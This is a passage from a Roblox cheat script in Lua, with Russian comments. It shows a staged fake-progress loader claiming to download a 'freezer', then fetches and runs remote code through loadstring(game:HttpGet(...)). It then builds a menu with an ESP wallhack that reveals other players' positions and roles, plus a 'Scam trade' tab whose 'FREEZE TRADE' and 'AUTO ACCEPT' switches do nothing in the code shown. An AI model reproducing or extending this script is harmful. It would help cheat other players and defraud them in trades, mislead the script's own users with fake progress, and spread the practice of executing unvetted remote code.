    LClose.TextColor3 = Color3.fromRGB(180, 180, 180)
    LClose.TextSize = 14
    LClose.Font = Enum.Font.GothamBold
    LClose.MouseButton1Click:Connect(function() LoaderGui:Destroy() end)
    
    local LStatus = Instance.new("TextLabel")
    LStatus.Parent = LFrame
    LStatus.Size = UDim2.new(1, 0, 0, 50)
    LStatus.Position = UDim2.new(0, 0, 0, 20)
    LStatus.BackgroundTransparency = 1
    LStatus.Text = "Спасибо за использование!"
    LStatus.TextColor3 = Color3.fromRGB(220, 220, 220)
    LStatus.TextSize = 16
    LStatus.Font = Enum.Font.GothamBold
    
    local PBarBg = Instance.new("Frame")
    PBarBg.Parent = LFrame
    PBarBg.Size = UDim2.new(0, 280, 0, 15)
    PBarBg.Position = UDim2.new(0.5, -140, 0.8, -20)
    PBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local PBarCorner = Instance.new("UICorner")
    PBarCorner.Parent = PBarBg
    PBarCorner.CornerRadius = UDim.new(1, 0)
    
    local PBar = Instance.new("Frame")
    PBar.Parent = PBarBg
    PBar.Size = UDim2.new(0, 0, 1, 0)
    PBar.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
    local PBarCorner2 = Instance.new("UICorner")
    PBarCorner2.Parent = PBar
    PBarCorner2.CornerRadius = UDim.new(1, 0)
    
    local PText = Instance.new("TextLabel")
    PText.Parent = LFrame
    PText.Size = UDim2.new(1, 0, 0, 30)
    PText.Position = UDim2.new(0, 0, 0, 120)
    PText.BackgroundTransparency = 1
    PText.Text = "0%"
    PText.TextColor3 = Color3.fromRGB(180, 180, 180)
    PText.TextSize = 14
    PText.Font = Enum.Font.Gotham

    local function updateStatus(text, delay)
        task.wait(delay)
        LStatus.Text = text
    end

    task.spawn(function()
        updateStatus("Спасибо за использование!", 0)
        task.wait(3)
        updateStatus("Начинается загрузка основных компонентов.", 0)
        for i = 1, 5 do
            LStatus.Text = LStatus.Text .. "."
            task.wait(0.3)
        end
        task.wait(18)
        updateStatus("Загрузка замораживателя...", 0)
        task.wait(3)
        updateStatus("Почти скачалось...", 0)
        task.wait(2)
        updateStatus("Последняя загрузка, она идёт примерно 2-5 минут в зависимости от интернета.", 0)
        
        local elapsed = 0
        local target = 180
        local current = 0
        while elapsed < target do
            local step = math.random(3, 8)
            current = current + step
            if current > 100 then current = 100 end
            TweenService:Create(PBar, TweenInfo.new(0.5), {Size = UDim2.new(current / 100, 0, 1, 0)}):Play()
            PText.Text = math.floor(current) .. "%"
            elapsed = elapsed + 1
            task.wait(1)
        end
        task.wait(0.5)
        LoaderGui:Destroy()
        
        -- ============================================================
        -- 4. МЕНЮ (ESP + SCAM TRADE)
        -- ============================================================
        repeat task.wait() until game:IsLoaded()

        local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local Camera = workspace.CurrentCamera

        WindUI:AddTheme({
            ["Name"] = "Dark",
            ["Accent"] = "#18181b",
            ["Dialog"] = "#18181b",
            ["Outline"] = "#FFFFFF",
            ["Text"] = "#FFFFFF",
            ["Placeholder"] = "#999999",
            ["Background"] = "#0e0e10",
            ["Button"] = "#52525b",
            ["Icon"] = "#a1a1aa"
        })
        WindUI:AddTheme({
            ["Name"] = "Purple",
            ["Accent"] = "#7c3aed",
            ["Dialog"] = "#6d28d9",
            ["Outline"] = "#c4b5fd",
            ["Text"] = "#faf5ff",
            ["Placeholder"] = "#a78bfa",
            ["Background"] = "#581c87",
            ["Button"] = "#8b5cf6",
            ["Icon"] = "#c4b5fd"
        })

        local MainWindow = WindUI:CreateWindow({
            ["Title"] = "Mertily's script",
            ["Icon"] = "zap",
            ["Author"] = "OP KEYLESS",
            ["Folder"] = "Mertily",
            ["Size"] = UDim2.fromOffset(450, 300),
            ["Theme"] = "Purple",
            ["Resizable"] = true,
            ["SideBarWidth"] = 130
        })

        local Tabs = {}
        Tabs.ESP = MainWindow:Tab({["Title"] = "ESP", ["Icon"] = "eye", ["Desc"] = "Mertily's script"})
        Tabs.Trade = MainWindow:Tab({["Title"] = "Scam trade", ["Icon"] = "solar:widget-bold", ["Desc"] = "Mertily's script"})

        -- ==================== ESP ТАБ (ВХ) ====================
        Tabs.ESP:Section({["Title"] = "ESP Controls"})

        local ESPEnabled = false
        local ESPLines = {}
        local ESPConn = nil

        local function GetPlayerColor(p)
            local c = p.Character
            local b = p:FindFirstChild("Backpack")
            if (b and b:FindFirstChild("Knife")) or (c and c:FindFirstChild("Knife")) then return Color3.fromRGB(255,0,0)
            elseif (b and b:FindFirstChild("Gun")) or (c and c:FindFirstChild("Gun")) then return Color3.fromRGB(0,0,255)
            else return Color3.fromRGB(0,255,0) end
        end

        local function Corners(part)
            local cf, s, c = part.CFrame, part.Size/2, {}
            for x=-1,1,2 do for y=-1,1,2 do for z=-1,1,2 do
                c[#c+1] = (cf * CFrame.new(s * Vector3.new(x,y,z))).Position
            end end end
            return c
        end

        local function DrawESP()
            for _, l in ipairs(ESPLines) do l:Remove() end
            ESPLines = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = p.Character.HumanoidRootPart
                    local verts = Corners({CFrame = hrp.CFrame*CFrame.new(0,-0.5,0), Size = Vector3.new(3,5,3)})
                    local col = GetPlayerColor(p)
                    local conns = {{1,2},{2,6},{6,5},{5,1},{1,3},{2,4},{6,8},{5,7},{3,4},{4,8},{8,7},{7,3}}
                    for _, pair in ipairs(conns) do
                        local fs, fv = Camera:WorldToViewportPoint(verts[pair[1]])
                        local ts, tv = Camera:WorldToViewportPoint(verts[pair[2]])
                        if fv or tv then
                            local l = Drawing.new("Line")
                            l.Thickness = 1.5
                            l.From = Vector2.new(fs.X, fs.Y)
                            l.To = Vector2.new(ts.X, ts.Y)
                            l.Color = col
                            l.Visible = true
                            table.insert(ESPLines, l)
                        end
                    end
                end
            end
        end

        Tabs.ESP:Toggle({
            ["Title"] = "ESP (Box)",
            ["Value"] = false,
            ["Callback"] = function(s)
                ESPEnabled = s
                if s then
                    ESPConn = RunService.RenderStepped:Connect(DrawESP)
                else
                    if ESPConn then ESPConn:Disconnect(); ESPConn = nil end
                    for _, l in ipairs(ESPLines) do l:Remove() end
                    ESPLines = {}
                end
            end
        })

        -- ==================== SCAM TRADE ТАБ ====================
        Tabs.Trade:Section({["Title"] = "Trade Scam Controls"})

        local function createSwitch(parent, yPos, label, cb)
            local c = Instance.new("Frame")
            c.Parent = parent
            c.Size = UDim2.new(1, -30, 0, 50)
            c.Position = UDim2.new(0, 15, 0, yPos)
            c.BackgroundTransparency = 1
            local l = Instance.new("TextLabel")
            l.Parent = c; l.Size = UDim2.new(0, 150, 1, 0); l.BackgroundTransparency = 1
            l.Text = label; l.TextColor3 = Color3.fromRGB(220,220,220); l.TextSize = 13; l.Font = Enum.Font.Gotham; l.TextXAlignment = Enum.TextXAlignment.Left
            local bg = Instance.new("Frame")
            bg.Parent = c; bg.Size = UDim2.new(0, 50, 0, 28); bg.Position = UDim2.new(1, -50, 0.5, -14)
            bg.BackgroundColor3 = Color3.fromRGB(60,60,60); local bgc = Instance.new("UICorner"); bgc.Parent = bg; bgc.CornerRadius = UDim.new(1,0)
            local knob = Instance.new("Frame")
            knob.Parent = bg; knob.Size = UDim2.new(0, 22, 0, 22); knob.Position = UDim2.new(0, 3, 0.5, -11)
            knob.BackgroundColor3 = Color3.fromRGB(255,255,255); local kc = Instance.new("UICorner"); kc.Parent = knob; kc.CornerRadius = UDim.new(1,0)
            local isOn = false
            local d = Instance.new("TextButton"); d.Parent = c; d.Size = UDim2.new(1,0,1,0); d.BackgroundTransparency = 1; d.Text = ""
            d.MouseButton1Click:Connect(function()
                isOn = not isOn
                local target = isOn and Color3.fromRGB(255,70,70) or Color3.fromRGB(60,60,60)
                local pos = isOn and UDim2.new(1, -25, 0.5, -11) or UDim2.new(0, 3, 0.5, -11)
                TweenService:Create(bg, TweenInfo.new(0.15), {BackgroundColor3 = target}):Play()
                TweenService:Create(knob, TweenInfo.new(0.15), {Position = pos}):Play()
                if cb then cb(isOn) end
            end)
        end

        createSwitch(Tabs.Trade, 10, "FREEZE TRADE")
        createSwitch(Tabs.Trade, 70, "AUTO ACCEPT")

        print("Mertily's script загружен!")
    end)
